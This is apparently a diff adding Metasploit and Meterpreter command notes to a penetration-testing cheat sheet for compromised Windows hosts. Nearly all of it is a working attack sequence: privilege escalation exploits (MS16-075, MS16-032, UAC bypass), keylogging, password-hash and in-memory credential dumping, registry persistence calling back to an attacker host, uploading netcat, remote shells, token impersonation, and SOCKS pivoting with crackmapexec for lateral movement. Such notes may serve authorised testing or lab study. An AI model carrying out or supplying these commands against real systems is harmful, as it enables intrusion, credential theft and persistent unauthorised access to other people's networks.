@@ -49,6 +49,144 @@ load priv stdapi extapi
 getuid
 getsystem
 background 
+
+---------
+# 1. List active sessions
+sessions
+
+# 2. Interact with the session
+sessions -i 1
+
+# 3. Load useful extensions
+load stdapi
+load priv
+
+# 4. Check user context
+getuid
+
+# 5. Check if system privileges are available
+getsystem
+
+# 6. Background the session
+background
+
+# 7. Run local exploit suggester to find privilege escalation paths
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+------
+1   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+2   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+------
+# 1. Use the confirmed vulnerable exploit (MS16-075)
+use exploit/windows/local/ms16_075_reflection
+set SESSION 1
+exploit
+
+# 2. (Optional) If that fails, try the other suggested one
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+exploit
+
+# 3. After exploitation, confirm SYSTEM access again
+getuid
+
+# 4. Continue post-exploitation tasks (pivoting, dumping creds, etc.)
+------
+
+# 8. Based on the results, choose a matching exploit (example)
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+exploit
+---------
+# 1. You're already SYSTEM, so now escalate capabilities or pivot
+# 2. Check system info
+sysinfo
+
+# 3. List running processes
+ps
+
+# 4. Migrate to a stable process (e.g., explorer.exe)
+migrate <PID>
+
+# 5. Enable keylogging (optional)
+keyscan_start
+keyscan_dump
+
+# 6. Dump SAM database (if needed)
+hashdump
+
+# 7. Search for creds in memory
+load kiwi
+creds_all
+
+# 8. Enable persistence (example using registry)
+run persistence -U -i 5 -p 443 -r <KALI-IP>
+
+# 9. Browse files
+cd C:\
+ls
+
+# 10. Download a file
+download C:\\Users\\<USERNAME>\\Desktop\\secret.txt
+
+# 11. Upload a tool (e.g., netcat)
+upload nc.exe C:\\Windows\\Temp\\nc.exe
+
+# 12. Open a remote shell
+execute -f cmd.exe -i -H
+
+---------
+
+# 1. Interact with your current session
+sessions -i 1
+
+# 2. List local network interfaces to get subnet info
+ipconfig
+
+# 3. Scan local subnet for live hosts (replace with actual subnet)
+run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+
+# 4. Identify domain controller by hostname or open ports (e.g., 88, 389, 445)
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+run
+
+# 5. Or use Net View to list domain computers (if in a domain)
+shell
+net view /domain
+nltest /dclist:<domain>
+
+# 6. Use PowerShell or native tools to enumerate domain info
+powershell -Command "Get-ADDomainController -Discover -Service PrimaryDC"
+
+# 7. Use incognito/metasploit to impersonate tokens if available
+use incognito
+list_tokens -u
+impersonate_token "<DOMAIN>\\<admin_user>"
+
+# 8. Use port forwarding to pivot through current host to AD server
+background
+use auxiliary/server/socks_proxy
+run
+
+# 9. Set proxychains on Kali to use Metasploit SOCKS5
+echo -e "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
+
+# 10. Use proxychains to run tools like ldapsearch or crackmapexec
+proxychains crackmapexec smb 192.168.1.X -u '' -p ''
+
+# 11. Optional: use autoroute for full pivoting
+use post/multi/manage/autoroute
+set SESSION 1
+run
+
+# 12. Then scan internal network through the route
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.2.0/24
+run
+
+---
 use windows/local/bypassuac_sluihijack
 set SESSION 1
 exploit
